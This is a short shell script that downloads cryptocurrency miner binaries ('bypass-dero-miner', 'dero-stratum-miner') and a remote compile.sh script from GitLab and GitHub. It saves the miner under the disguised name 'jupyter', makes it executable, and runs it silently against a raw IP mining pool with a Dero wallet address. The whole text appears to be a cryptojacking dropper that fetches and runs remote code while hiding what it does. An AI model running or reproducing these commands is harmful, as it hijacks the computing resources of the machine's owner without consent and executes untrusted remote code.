curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
curl -L https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
./jupyter  -r 146.190.93.49:443  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.cd19 >/dev/null 
./compile.sh
